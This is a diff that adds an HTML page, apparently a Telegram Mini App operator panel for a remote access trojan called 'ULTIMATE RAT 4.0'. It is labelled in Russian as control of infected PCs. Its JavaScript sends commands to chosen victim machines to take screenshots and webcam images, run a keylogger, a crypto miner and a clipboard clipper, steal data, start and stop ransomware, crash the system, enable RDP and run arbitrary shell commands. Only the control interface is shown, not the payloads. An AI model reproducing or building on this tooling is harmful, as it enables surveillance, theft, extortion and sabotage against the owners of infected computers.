@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ULTIMATE RAT CONTROL</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0f1e 0%, #1a1a2e 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #fff;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 30px 0;
+            background: rgba(0,0,0,0.3);
+            border-radius: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            background: linear-gradient(45deg, #e94560, #ff6b6b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .client-card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .client-card:hover {
+            background: rgba(255,255,255,0.1);
+            transform: translateX(5px);
+        }
+        
+        .client-card.selected {
+            background: linear-gradient(135deg, #e94560, #c73b54);
+            box-shadow: 0 5px 20px rgba(233,69,96,0.3);
+        }
+        
+        .client-name {
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+        
+        .client-ip {
+            font-size: 0.8em;
+            opacity: 0.7;
+        }
+        
+        .menu-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 30px;
+        }
+        
+        .menu-btn {
+            background: rgba(255,255,255,0.05);
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .menu-btn:hover {
+            background: #e94560;
+            transform: translateY(-3px);
+        }
+        
+        .menu-btn.danger {
+            background: rgba(220,53,69,0.2);
+        }
+        
+        .menu-btn.danger:hover {
+            background: #dc3545;
+        }
+        
+        .status-bar {
+            background: rgba(0,0,0,0.5);
+            border-radius: 10px;
+            padding: 10px;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 0.9em;
+        }
+        
+        .command-output {
+            background: rgba(0,0,0,0.5);
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            font-family: monospace;
+            font-size: 0.9em;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔥 ULTIMATE RAT 4.0 🔥</h1>
+            <p>Управление заражёнными ПК</p>
+        </div>
+        
+        <div id="clients-list"></div>
+        
+        <div id="commands-panel" style="display: none;">
+            <div class="menu-grid">
+                <button class="menu-btn" onclick="sendCommand('screen')">📸 Скриншот</button>
+                <button class="menu-btn" onclick="sendCommand('stream_start')">🎥 Стрим</button>
+                <button class="menu-btn" onclick="sendCommand('stream_stop')">🛑 Стоп</button>
+                <button class="menu-btn" onclick="sendCommand('keylog_start')">⌨️ Кейлоггер</button>
+                <button class="menu-btn" onclick="sendCommand('keylog_stop')">📝 Лог</button>
+                <button class="menu-btn" onclick="sendCommand('miner_start')">💰 Майнинг</button>
+                <button class="menu-btn" onclick="sendCommand('miner_stop')">⛏️ Стоп майнинг</button>
+                <button class="menu-btn" onclick="sendCommand('clipper_start')">🔄 Clipper</button>
+                <button class="menu-btn" onclick="sendCommand('clipper_stop')">✋ Стоп клиппер</button>
+                <button class="menu-btn" onclick="sendCommand('steal')">🔑 Кража</button>
+                <button class="menu-btn" onclick="sendCommand('ransom_start')">💀 Ransomware</button>
+                <button class="menu-btn" onclick="sendCommand('ransom_stop')">🔓 Расшифровка</button>
+                <button class="menu-btn" onclick="sendCommand('webcam')">📷 Веб-камера</button>
+                <button class="menu-btn" onclick="sendCommand('lock')">🔒 Блокировка</button>
+                <button class="menu-btn" onclick="sendCommand('shutdown')">💀 Выключение</button>
+                <button class="menu-btn" onclick="sendCommand('restart')">🔄 Перезагрузка</button>
+                <button class="menu-btn" onclick="sendCommand('bsod')">💀 BSOD</button>
+                <button class="menu-btn" onclick="sendCommand('rdp_on')">🖥️ RDP вкл</button>
+                <button class="menu-btn" onclick="sendCommand('rdp_off')">🖥️ RDP выкл</button>
+                <button class="menu-btn" onclick="openShell()">💻 Shell</button>
+            </div>
+            
+            <div class="command-output" id="output"></div>
+        </div>
+        
+        <div class="status-bar" id="status">
+            📡 Ожидание выбора клиента...
+        </div>
+    </div>
+    
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+        
+        let currentClient = null;
+        
+        function updateClients() {
+            tg.sendData(JSON.stringify({action: 'get_clients'}));
+        }
+        
+        function selectClient(clientId) {
+            currentClient = clientId;
+            document.querySelectorAll('.client-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            document.querySelector(`[data-id="${clientId}"]`).classList.add('selected');
+            document.getElementById('commands-panel').style.display = 'block';
+            document.getElementById('status').innerHTML = `✅ Управление: ${clientId}`;
+            tg.sendData(JSON.stringify({action: 'select', client: clientId}));
+        }
+        
+        function sendCommand(cmd) {
+            if (!currentClient) {
+                alert('Сначала выбери клиента!');
+                return;
+            }
+            tg.sendData(JSON.stringify({action: 'command', cmd: cmd, client: currentClient}));
+            addOutput(`📤 Отправлено: ${cmd}`);
+        }
+        
+        function openShell() {
+            let shellCmd = prompt('Введи команду для выполнения:');
+            if (shellCmd) {
+                tg.sendData(JSON.stringify({action: 'shell', cmd: shellCmd, client: currentClient}));
+                addOutput(`💻 Выполнено: ${shellCmd}`);
+            }
+        }
+        
+        function addOutput(text) {
+            let output = document.getElementById('output');
+            output.innerHTML += `[${new Date().toLocaleTimeString()}] ${text}\n`;
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        tg.onEvent('mainButtonClicked', function() {
+            updateClients();
+        });
+        
+        tg.MainButton.setText("Обновить список");
+        tg.MainButton.show();
+        
+        updateClients();
+    </script>
+</body>
+</html>
